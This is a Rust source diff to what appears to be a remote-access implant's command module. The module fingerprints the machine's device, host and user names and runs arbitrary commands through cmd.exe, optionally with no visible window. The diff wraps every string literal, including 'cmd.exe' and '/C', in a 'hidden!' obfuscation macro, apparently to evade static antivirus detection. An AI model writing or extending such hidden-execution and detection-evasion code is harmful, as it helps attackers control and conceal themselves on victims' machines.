@@ -1,4 +1,4 @@
-use anyhow::anyhow;
+use common::hidden;
 use encoding_rs::GBK;
 use std::process::Stdio;
 use tokio::io::{AsyncRead, AsyncReadExt};
@@ -7,19 +7,20 @@ use tokio::process::Command;
 const MAX_EXEC_OUTPUT_BYTES: usize = 1024 * 1024;
 
 pub fn whoami() -> String {
-    format!(
-        "{}\\{}\\{}",
+    hidden!(
         whoami::devicename(),
-        whoami::fallible::hostname().unwrap_or_else(|_| "unknown-host".to_string()),
+        "\\",
+        whoami::fallible::hostname().unwrap_or_else(|_| hidden!("unknown-host")),
+        "\\",
         whoami::username()
     )
 }
 
 pub async fn cmd_exec_line(cmd_line: &str, open_window: bool, gbk: bool) -> anyhow::Result<String> {
     if cmd_line.trim().is_empty() {
-        return Err(anyhow!("命令不能为空"));
+        return Err(anyhow::Error::msg(hidden!("命令不能为空")));
     }
-    let mut cmd = Command::new("cmd.exe");
+    let mut cmd = Command::new(hidden!("cmd.exe"));
 
     let command = if open_window {
         &mut cmd
@@ -27,7 +28,7 @@ pub async fn cmd_exec_line(cmd_line: &str, open_window: bool, gbk: bool) -> anyh
         cmd.creation_flags(0x08000000)
     };
 
-    command.arg("/C").arg(cmd_line);
+    command.arg(hidden!("/C")).arg(cmd_line);
 
     collect_output(command, gbk).await
 }
@@ -42,11 +43,11 @@ async fn collect_output(command: &mut Command, gbk: bool) -> anyhow::Result<Stri
     let stdout = child
         .stdout
         .take()
-        .ok_or_else(|| anyhow!("无法读取 stdout"))?;
+        .ok_or_else(|| anyhow::Error::msg(hidden!("无法读取 stdout")))?;
     let stderr = child
         .stderr
         .take()
-        .ok_or_else(|| anyhow!("无法读取 stderr"))?;
+        .ok_or_else(|| anyhow::Error::msg(hidden!("无法读取 stderr")))?;
     let (status, stdout, stderr) = tokio::try_join!(
         child.wait(),
         read_stream_capped(stdout),
@@ -54,12 +55,16 @@ async fn collect_output(command: &mut Command, gbk: bool) -> anyhow::Result<Stri
     )?;
     let (stdout, stdout_truncated) = stdout;
     let (stderr, stderr_truncated) = stderr;
-    let mut result = format!("{}{}", try_decode(&stdout, gbk), try_decode(&stderr, gbk));
+    let mut result = hidden!(try_decode(&stdout, gbk), try_decode(&stderr, gbk));
     if stdout_truncated || stderr_truncated {
-        result.push_str("\n[输出已截断，stdout/stderr 各最多保留 1 MiB]");
+        result.push_str(&hidden!("\n[输出已截断，stdout/stderr 各最多保留 1 MiB]"));
     }
     if !status.success() {
-        result.push_str(&format!("\n[进程退出码: {:?}]", status.code()));
+        let exit_code = status
+            .code()
+            .map(|code| code.to_string())
+            .unwrap_or_else(|| hidden!("被信号终止"));
+        result.push_str(&hidden!("\n[进程退出码: ", exit_code, "]"));
     }
     Ok(result)
 }
@@ -89,16 +94,14 @@ fn try_decode(bys: &[u8], gbk: bool) -> String {
         //                  enc:实际使用编码格式,error:是否存在因格式错误而被替换的序列
         let (res, _encoding, err) = GBK.decode(bys);
         if err {
-            format!("GBK解码失败！utf-8: {}", String::from_utf8_lossy(bys))
+            hidden!("GBK解码失败！utf-8: ", String::from_utf8_lossy(bys))
         } else {
             res.to_string()
         }
     } else {
         match String::from_utf8(bys.to_vec()) {
             Ok(s) => s,
-            Err(_) => {
-                format!("Utf-8解码失败！gbk: {}", GBK.decode(bys).0)
-            }
+            Err(_) => hidden!("Utf-8解码失败！gbk: ", GBK.decode(bys).0),
         }
     }
 }
